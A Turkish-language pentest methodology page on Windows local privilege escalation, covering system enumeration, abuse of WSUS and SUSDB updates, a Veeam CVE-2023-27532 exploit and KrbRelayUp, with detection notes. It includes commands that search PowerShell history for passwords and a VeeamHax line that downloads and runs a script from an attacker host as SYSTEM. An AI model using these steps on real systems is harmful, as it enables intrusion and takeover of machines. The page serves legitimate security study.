# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows'ta yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfada, temel nitelikteki çeşitli kılavuzlardan alınan genel Windows yetki yükseltme metodolojisi bir araya getirilmiştir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamalı enumerasyon akışında topluluk atölyelerinden ve kontrol listelerinden de yararlanılmıştır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyalleri arasında Windows yetki yükseltme konulu DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

Kısa bir gözden geçirme için [yerel yetki yükseltme kontrol listesini](../checklist-windows-privilege-escalation.md) kullanın.

## Windows Hakkında Temel Bilgiler

### Erişim Belirteçleri

**Windows erişim belirteçlerinin ne olduğunu bilmiyorsanız devam etmeden önce şu sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için şu sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız devam etmeden önce şu sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumere etmenizi**, yürütülebilir dosyaları çalıştırmanızı ve hatta **faaliyetlerinizin tespit edilmesini** engelleyebilecek çeşitli unsurlar vardır. Yetki yükseltme enumerasyonuna başlamadan önce aşağıdaki **sayfayı** **okuyup** tüm bu **savunma mekanizmalarını** **enumere etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess Sessiz Yetki Yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess işlemleri, AppInfo güvenli yol kontrolleri atlandığında istem göstermeden High IL düzeyine ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection atlatma iş akışına buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, rastgele bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Güncel Windows sürümlerinde, ayrıcalıklı yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB rastgele port** LPE yolu da sunulmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

Mevcut bir PowerShell oturumundan yerel envanter çıkarmak için [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md) sayfasına bakın. Bu örnekler, ayrı enumerasyon çalıştırılabilir dosyaları başlatmadan aşağıdaki kontrolleri tamamlar.

### Sürüm bilgilerini enumere etme

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploitleri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur; bu da Windows ortamının sunduğu **muazzam saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve olası ilgili güvenlik duyurularını listeler; bir sonucu uygulanabilir kabul etmeden önce tam ürünü ve yerine geçen güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için işletim sistemi mimarisinin yanı sıra **çalışan işlemin mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir işlem [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine yönlendirilirken `%windir%\Sysnative`, işlemin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir işlem için kullanılamaz. İşletim sistemi derlemesi veya eksik KB adayı, açığın istismar edilebilir olduğunu kanıtlamaz; çalışan derlemeyi, yüklü olan veya onun yerine geçen güncellemeyi, işlem mimarisini ve exploit ön koşullarını, ilgili soruna ait [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

Hizmet belleği bozulmasına dair bir örnek için [istemci tarafından kontrol edilen MIDI paylaşımlı bellek halkası ofsetlerine](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) bakın. Yayımlanan stack ofsetleri yalnızca test edilen derleme için geçerlidir; `LOCAL SERVICE` düzeyine ulaşmak, daha sonra `SYSTEM` düzeyine yükselten [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) adımından farklıdır.<sup>[[44]](#references)</sup>

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin GitHub depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgisi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Yazılabilir bir [PowerShell profili](../basic-powershell-for-pentesters/#powershell-profile-startup-injection), başlangıçta kod yürütmeye yönelik ayrı bir fırsattır; bunu yetki yükseltme olarak değerlendirmeden önce daha ayrıcalıklı bir kullanıcının bu profili gerçekten yükleyip yüklemediğini kontrol edin.

### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transkripti incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transkript, kimlik bilgileri dahil komut bağımsız değişkenlerini ve çıktıyı içerebilir. Okunabilir bir transkript, yalnızca içeriği kullanılabilir ve daha yüksek ayrıcalıklara sahip bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa bir ipucudur.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahildir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümündeki yönergeleri izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Script'in yürütülmesine ilişkin eksiksiz etkinlik ve içerik kaydı tutulur; böylece her kod bloğu çalışırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve adli incelemeler ile kötü amaçlı davranışların analizinde değer sağlar. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için loglama olayları, Windows Olay Görüntüleyicisi'nde şu yolda bulunabilir: **Uygulama ve Hizmet Günlükleri > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Önceki yönergelerde risk şu şekilde özetlenmişti:

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

HTTP WSUS endpoint'i, güncelleme metadata'sının ele geçirilmesi açısından incelenmesi gereken bir noktadır. Exploitation ayrıca istemcinin bu WSUS sunucusunu kullanmasına, saldırganın trafiği ele geçirebilmesine veya kontrol edebilmesine ve istemcinin güncelleme güveni ile yükleme politikasına bağlıdır. URL tek başına kod yürütüldüğünü göstermez. [Microsoft, WSUS metadata'sı için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını, cmd'de aşağıdaki komutu çalıştırarak kontrol etmeye başlayabilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Aşağıdakilerden biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

Orijinal uygulanabilirlik ifadesi şöyleydi:

O hâlde **istismar edilebilir.** Son kayıt defteri değeri `0` ise WSUS girdisi yok sayılır.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolunun bir ön koşulunu doğrular; ancak interception'ın, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş yetkilerle kurulumun mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu politikada yapılandırılmış WSUS endpoint'i seçilmez.

Bu zafiyetleri istismar etmek için [Wsuxploit](https://github.com/pimps/wsuxploit) ve [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL kullanmayan WSUS trafiğine 'sahte' güncellemeler enjekte etmek için kullanılan weaponized MiTM exploit script'leridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak bu, hatanın istismar ettiği açıktır:

> Yerel kullanıcı proxy ayarlarımızı değiştirebiliyorsak ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi dinlemek ve sistemimizde yükseltilmiş yetkili bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından, o kullanıcının sertifika deposunu da kullanır. WSUS hostname'i için self-signed bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini dinleyebiliriz. WSUS, sertifikada ilk kullanımda güven türü bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyorsa ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (yayımlandığında) istismar edebilirsiniz.

### WSUS yöneticisinin kontrolündeki güncellemeler

Geçerli kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol vardır. Sunucudaki `WSUS Administrators` grubunun etkin üyeliğini ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda kurulduğunu doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme istismarı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını dinlemekten farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) stored procedure'lere** yeterli erişime sahip olmaktır. Pratik bir erişim yolu, upstream WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay etmektir. Kesin ön koşul dağıtıma bağlıdır; bu nedenle SQL administrator haklarını varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanı relay'ini ve procedure izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda önce WSUS sunucusu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Sunucunun SQL rolü, tablolara doğrudan yazma izni olmasa bile güncelleme yayımlama procedure'lerini kullanma yetkisi sağlayabilir; `SUSDB` üzerinde başarısız bir `UPDATE` işlemi, yayımlamanın engellendiğini göstermez. Özel bir güncelleme oluşturmaya çalışmadan önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve procedure izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı prosedür tanımları ve kurulu `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken kullanışlıdır. Hem bundle üst öğesi hem de payload alt öğesi `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revizyon kimliğini kaydedin ve bundle ilişkisini, özetleri, boyutu, içerik URL'sini ve revizyonu tutarlı tutun. Bu, durum bilgisi tutan bir yayımlama iş akışıdır; bu nedenle başarılı tek bir stored procedure çağrısı, istemci tarafında yürütmenin gerçekleştiğini kanıtlamaz.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturun, hedefleyin ve onaylayın

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Önkoşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bir bilgisayar grubunu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için yüklemeyi onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özetler, boyut ve `CommandLineInstallation` işleyicisi içe aktarılan meta veriler ve parçalar arasında birbiriyle uyumlu olmalıdır. İçerik URL'sini ve hedef grubunu atadıktan sonra son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD imajı olduğunu önceden doğrulamadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılmış değiştirilmemiş bir PE, içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir policy/type-confusion hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kayıtlı içeriği getirir. Kaynağın BITS'in HTTP beklentilerini karşılaması gerekir: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım başlangıçta `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protocol header gerektirdiğini belirten WSUS senkronizasyon `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bunu çalıştırmak üzere değiştirilmiş bir MSSQL client içerir ve içerik staging'i için `BitsWebServer.py` sunar. Yetkili bir laboratuvarda kullanılabilecek minimal komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` ayarındaki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmeden indirilip yapılandırılan zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sonlandıktan hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı tekrarlanan bir yürütme kalıcılığına dönüşebilir. İstemcide güncelleme başarısız durumu görülebildiğinden bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve sıkılaştırma pivotları

Bu zincirden yararlanılabilecek sunucu ve istemci tarafı pivotları:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırılmasını denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmeyen kullanıcılar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları inceleyin.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı uzantı ve içerik imzasıyla ilişkilendirin, yalnızca dosya uzantısına güvenmeyin.
- Windows Update'in tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adlı içerikten kaynaklanan PE yürütmesini ya da beklenmeyen alt süreç/ağ etkinliğini araştırın.
- Desteklenen durumlarda veritabanı hizmetinde Kimlik Doğrulaması için Genişletilmiş Koruma'yı zorunlu kılın ve veritabanı ağı erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle kısıtlayın. Özel güncelleme yordamları üzerindeki `EXECUTE` izinlerini en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (yerel privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyorsa ve güncelleyici sahte bir root CA'ya veya zayıf imzalayan denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI iletebilir. Genelleştirilmiş tekniğe (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) buradan bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Sürüme özgü ilk açıklama ve keşif notu şöyleydi:

Veeam B&R < `11.0.1.1261`, saldırganın kontrolündeki mesajları işleyen ve **NT AUTHORITY\SYSTEM** olarak rastgele komutlar çalıştırılmasına olanak tanıyan bir localhost hizmetini **TCP/9401** üzerinde sunar.<sup>[[12]](#references)</sup>

- **Recon**: dinleyiciyi ve sürümü doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` komutlarını kullanın.

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde çalışan bir çekirdek yedekleme hizmeti kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan açığa çıkmasını açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Recon**: TCP/9401'in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından yüklenen ürünü ve yama meta verilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu verir, ancak yama durumunu eksiksiz doğrulamaz.
- **Sabitlenen sürüm sınırları**: Veeam, **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini ilk düzeltilmiş sürümler olarak listeler; önceki sürümler etkilenir. Dört bileşenli bir dosya sürümü, aynı build numaralarındaki yamalanmamış temel build ile daha sonraki bir yamayı tek başına ayırt edemez. Sınır build'ini düzeltilmiş kabul etmeden önce yama tanımlayıcısını [üreticinin build geçmişinden](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gereken Veeam DLL'leriyle birlikte aynı dizine yerleştirin, ardından yerel soket üzerinden SYSTEM payload'ını tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Hizmet komutu SYSTEM olarak yürütür.

Alıntılanan PoC, ek önkoşullar sağlandığında komutun SYSTEM olarak yürütülebildiğini gösterir; satıcının güvenlik duyurusu kimlik bilgisi ifşası sorununu açıklar.

## KrbRelayUp

Varsayılan ortamın ilk açıklaması şöyleydi:

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing'in zorunlu kılınmadığı**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına izin veren self-rights izinlerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar yer alır. Bu **gereksinimlerin** **varsayılan ayarlarla** karşılandığını belirtmek önemlidir.

Yerel bir Kerberos relay, uygun bir COM server kimlik doğruladığında ve relay edilen principal hedef nesne üzerinde yetkilere sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini açıklar; KrbRelayUp bu yollardan bazılarını otomatikleştirir. Bir RBCD zinciri, geçerli delegation ve hedef nesne izinleri gerektirirken shadow-credential zinciri key-credential yazma izinleri ve sertifika kimlik doğrulama yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca domain üyeliğiyle mümkün olmaz.

